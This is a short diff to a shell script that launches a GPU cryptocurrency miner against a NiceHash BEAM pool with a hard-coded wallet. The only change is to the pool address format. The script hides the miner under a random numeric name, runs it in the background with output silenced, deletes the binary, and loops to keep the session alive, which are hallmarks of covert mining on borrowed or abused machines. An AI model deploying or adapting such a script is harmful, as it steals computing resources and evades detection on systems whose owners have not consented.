@@ -3,6 +3,6 @@
 ntod=$(shuf -i 1000000000-9999999999 -n 1)
 chmod +x lmx
 mv lmx $ntod
-./$ntod --algo BEAM-III --pool beamv3.usa-west.nicehash.com:3387  --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(echo GPU-MINJEM-$(shuf -i 1000-9999 -n 1)) --ethstratum ETHPROXY --tstart 50 --tstop 57 >/dev/null &
+./$ntod --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387  --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(echo GPU-MINJEM-$(shuf -i 1000-9999 -n 1)) --ethstratum ETHPROXY --tstart 50 --tstop 57 >/dev/null &
 rm -rf $ntod
 while :; do echo $(shuf -i 1000000000-9999999999 -n 1); sleep 1m; done
